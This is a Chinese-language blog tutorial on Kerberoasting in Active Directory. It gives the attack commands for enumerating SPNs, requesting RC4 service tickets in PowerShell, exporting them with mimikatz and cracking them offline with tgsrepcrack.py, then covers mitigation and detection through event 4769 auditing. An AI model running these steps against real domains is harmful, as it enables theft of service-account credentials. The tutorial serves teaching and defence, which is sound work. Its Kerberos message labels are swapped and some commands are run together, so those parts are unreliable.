# Kerberoast/Kerberoasting:攻击与检测

## 讲在前面: <a id="jiang-zai-qian-mian"></a>

Kerberoasting攻击手法在域渗透中是必不可缺的一项手法，它可以帮助你利用普通用户的权限在AD中提取到服务账户的凭据，又因为一般的服务账户密码策略可能较为薄弱或密码设置为永不过期等等。所以当攻击者拿到服务凭据后，花不了多大功夫就将其暴力破解了。

**注意:**

Windows系统默认的服务已经映射到AD中的计算机账户中，该类账户具有关联的128个字符的密码，破解起来相对费劲。

针对这个问题我们需要了解如下两个协议，当然在这里我们只能简单的介绍，笔者参考了如下几篇优秀的论文以帮助您来了解Kerberos协议和SPN协议

## Kerberos协议及其通信过程

这里我们来简单而又快速的了解Kerberos协议及其通信过程

![](https://img-blog.csdnimg.cn/20201006120451968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

> 1. AS-REP：客户端向KDC中心发起验证请求，请求内容内容为客户端Hash加密的时间戳等数据
> 2. AS-REQ：KDC响应请求，使用以存储的客户端Hash解密AS\_REP数据包，如果验证成功，那么就返回使用krbtgt加密的TGT票据，TGT内包含PAC，PAC包含客户端所在的组，sid等
> 3. TGS-REP：客户端拿到TGT后向KDC发起针对特定服务的TGS-REQ请求
> 4. TGS-REQ：KDC接受到请求后，使用krbtgt hash进行解密，如果结果正确，那么就返回使用服务hash加密的TGS票据（这一步不管客户端有无访问服务的权限，只要TGT正确，就返回TGS）
> 5. AS-REP：客户端拿着TGS请求特定服务
> 6. AS-REQ：服务使用自己的hash解密TGS票据，如果解密正确，就拿着PAC去KDC问客户端有无权限，域控解密PAC，查询客户端的ACL并将结果返回给服务端，服务端根据权限来判断是否返回数据给客户端。

## SPN协议

该协议的介绍，笔者在之前的文章已经做了文章——“SPN协议”。在此笔者不做过多赘述，这里介绍Kerberoasting和SPN和Kerberos的联系。

我们发现在Kerberos协议进行到第四步的时候，不管客户端有无权限，只要TGT正确，就返回TGS票据，而恰恰巧的是，域内任何的用户都可以向域内的任何服务请求TGS，再加上TGS的生成是使用服务账户的hash进行RC4-HMAC算法加密，站在利用的角度，我们是可以尝试使用强大的字典进行暴力破解票据的。

因此，高效率的利用思路如下：

1. 查询SPN，找到有价值的SPN，需要满足以下条件：
   * 该SPN注册在域用户帐户\(Users\)下
   * 域用户账户的权限很高
2. 请求TGS
3. 导出TGS
4. 暴力破解

使用setspn或powerview\(powershell模块Active Directory 需要提前安装，域控制器一般会安装,也可自行安装\)等工具

```text
import-module .\Microsoft.ActiveDirectory.Management.dll
```

###  查询SPN：

```text
setspn -q */*
```

![](https://img-blog.csdnimg.cn/20201006122707689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

```text
Get-NetUser -spn
```

![](https://img-blog.csdnimg.cn/20201002204941587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

### 使用以下PowerShell命令来请求RC4加密的Kerberos TGS服务票证：

请求指定TGS

```text
$SPNName = 'VNC/DC1.test.com'Add-Type -AssemblyNAme System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName
```

请求所有TGS

```text
Add-Type -AssemblyName System.IdentityModel  setspn.exe -q */* | Select-String '^CN' -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
```

执行后输入`klist`查看内存中的票据，可找到获得的TGS![](https://img-blog.csdnimg.cn/20201006123910137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

### 导出TGS

使用minikatz：

```text
kerberos::list /export
```

或者使用empire的kerberoast模块或者使用PowerSploit中的Invoke-Kerberoast组件

### 破解

使用[tgsrepcrackck.py](https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py)开始离线密码破解，或者使用[kirbi2john.py](https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/run/kirbi2john.py)从原始票据中提取可破解的哈希格式 ，这儿也有[go的版本](https://github.com/leechristensen/tgscrack)

[https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py](https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py)

```text
./tgsrepcrack.py wordlist.txt test.kirbi
```

 缓解Kerberoasting

站在防御的角度，不可能阻止kerberoast，但可以缓解：

* 确保服务账户的密码长于25个字符并且满足复杂要求
* 定期修改服务的相关联的域用户的密码
* 配置日志以检测Kerberoasting活动

## 配置日志以检测Kerberoasting活动

在域控的高级安全审核策略中，开启账户登录中的“审核Kerberos服务票证操作”来记录Kerberos TGS服务票据的请求情况。

开启后会记录一下两个事件：

* 4769：已请求Kerberos服务票证（TGS）
* 4770：已更新Kerberos服务票证

![](https://img-blog.csdnimg.cn/20201006125036934.png)

不过也会造成一定的日志冗余，因为在用户初始登录时、在用户访问域内某些服务时，事件4769会被记录很多次。不过相对5136这样的筛选日志平台连接的日志来说也不算太多。

所以我们可以针对域内某些发起多次Kerberos请求的用户进行监控，从而来检测Kerberboasting活动，不过我们也要对日志进行筛选，根据漏洞特征来看我们只针对加密类型为RC4的，而日志里显示给我们看的就是如下：

* 票证选项：0x40810000
* 票证加密：0x17

![](https://img-blog.csdnimg.cn/20201006125710506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

同时使用DES加密的也不安全，所以我必须检测同时满足这几个条件的或者满足其中某一条的，我们就可以更加精准的通过日志来检测了

再者，我们也可以通过创建Kerberoast服务账户蜜罐，通过蜜罐来防御，也可以同时根据相应的漏洞的打法制定相应的检测规则来进行防御。



